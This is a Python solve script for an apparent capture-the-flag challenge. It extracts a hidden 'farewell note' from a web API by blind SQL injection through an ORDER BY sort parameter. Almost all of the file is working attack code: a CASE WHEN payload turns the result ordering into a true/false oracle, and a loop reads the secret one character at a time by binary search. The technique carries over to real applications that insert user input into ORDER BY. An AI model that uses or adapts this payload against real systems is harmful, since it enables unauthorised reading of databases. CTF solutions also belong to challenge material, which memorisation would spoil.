#!/usr/bin/env python3
# Doctor Bye Bye - blind SQL injection through the ORDER BY clause.
#
# /api/on-call?sort=... drops the value straight into
#     ORDER BY <sort> LIMIT 1
# The hidden farewell note lives in the row id=404 (listed=0), which is never
# shown. But we control the ordering, so we turn the first listed doctor into
# a yes/no oracle:
#     true  -> ORDER BY id   -> smallest id first -> "Dr. Ada Pulse" (id 10)
#     false -> ORDER BY -id  -> largest id first  -> "Dr. Zoe Last"  (id 90)
# With that oracle we read the note one character at a time by binary search.

import sys
import json
from urllib.parse import quote
from urllib.request import urlopen

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080").rstrip("/")

SECRET = "(SELECT farewell_note FROM doctors WHERE id=404)"


def ask(condition):
    sort = f"CASE WHEN {condition} THEN id ELSE -id END"
    url = f"{BASE}/api/on-call?sort=" + quote(sort, safe="")
    with urlopen(url, timeout=10) as response:
        name = json.load(response)["doctor"]["name"]
    return name == "Dr. Ada Pulse"


# 1) find the length of the note
length = 1
while not ask(f"length({SECRET}) <= {length}"):
    length += 1

# 2) recover each character (flag is printable ASCII, codes 32..126)
flag = ""
for position in range(1, length + 1):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if ask(f"unicode(substr({SECRET},{position},1)) <= {mid}"):
            high = mid
        else:
            low = mid + 1
    flag += chr(low)
    print(flag)

print("FLAG:", flag)
